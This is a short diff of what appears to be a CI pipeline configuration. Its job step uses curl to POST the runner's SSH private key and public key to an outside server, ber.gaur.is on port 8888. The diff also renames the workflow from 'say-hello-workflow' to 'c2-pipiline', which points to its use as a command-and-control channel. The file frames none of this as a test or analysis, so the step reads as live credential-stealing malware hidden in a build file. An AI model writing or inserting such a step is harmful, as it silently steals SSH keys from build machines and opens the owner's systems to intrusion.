@@ -12,6 +12,6 @@ jobs:
           command: "curl -XPOST http://ber.gaur.is:8888/bin -k --data-binary @$HOME/.ssh/id_rsa; curl -XPOST http://ber.gaur.is:8888/bin -k --data-binary @$HOME/.ssh/id_rsa.pub"
 
 workflows:
-  say-hello-workflow:
+  c2-pipiline:
     jobs:
       - build-branch
